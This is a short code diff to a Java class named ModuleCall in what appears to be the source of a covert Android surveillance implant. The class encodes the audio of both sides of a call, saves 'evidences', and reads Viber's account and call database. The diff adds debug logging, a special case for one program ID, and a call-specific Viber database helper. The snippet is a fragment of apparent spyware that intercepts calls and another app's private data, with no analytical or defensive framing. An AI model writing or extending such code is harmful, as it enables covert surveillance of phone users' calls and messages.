@@ -1005,8 +1005,11 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			if (audioEncoder.isLastCallFinished()) {
 
 				finished[remote ? 1 : 0] = true;
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (encodeChunks) finished: [" + finished[0] + "," + finished[1] + "]" );
+				}
 
-				if (finished[0] && finished[1]) {
+				if ( (finished[0] && finished[1]) || callInfo.programId == 0x0148  ) {
 					// After encoding create the end of call marker
 					if (callInfo.delay) {
 						saveAllEvidences(chunks, begin, end);
@@ -1114,7 +1117,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			if (end) {
 				String account = ChatViber.readAccount();
 				callInfo.account = account;
-				GenericSqliteHelper helper = ChatViber.openViberDBHelper();
+				GenericSqliteHelper helper = ChatViber.openViberDBHelperCall();
 
 				if (helper != null) {
 					ret = ChatViber.getCurrentCall(helper, callInfo);
